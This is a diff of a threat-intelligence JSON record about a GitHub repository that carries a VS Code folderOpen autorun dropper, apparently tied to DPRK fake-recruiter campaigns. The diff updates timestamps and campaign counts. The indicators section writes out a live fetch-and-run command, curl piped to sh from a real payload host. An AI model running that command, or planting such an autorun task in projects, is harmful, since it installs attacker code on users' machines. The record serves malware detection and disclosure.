@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 15)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/huncholane_defi_property.json",
     "reviewer_decision": "",
     "notes": ""
@@ -125,7 +125,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/huncholane/defi_property",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-extensions-bootstrap.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-extensions-bootstrap.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-extensions-bootstrap.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-extensions-bootstrap.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-extensions-bootstrap.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-extensions-bootstrap.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-extensions-bootstrap.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-extensions-bootstrap.vercel.app",
     "publisher": "huncholane",
     "severity_level": "critical",
@@ -143,7 +143,7 @@
     "evidence_references": "https://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/.vscode/tasks.json\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/scripts/deploy.js#L4\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/scripts/deploy.js#L86\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/scripts/deploy.js#L93\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/users.controller.js#L10\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/common.controller.js#L12\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/common.controller.js#L32\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/common.controller.js#L41\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/auth.controller.js#L13\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/auth.controller.js#L28\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/auth.controller.js#L93\nhttps://github.com/huncholane/defi_property/blob/7aa6e01fb3d760b9d83f988d6b64f62755879c8c/server/controllers/auth.controller.js#L102",
     "verified_iocs": "vscode-extensions-bootstrap.vercel.app\nhttps://vscode-extensions-bootstrap.vercel.app/settings/mac?flag=308\nhttps://vscode-extensions-bootstrap.vercel.app/settings/linux?flag=308\ncurl 'https://vscode-extensions-bootstrap.vercel.app/settings/mac?flag=308' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
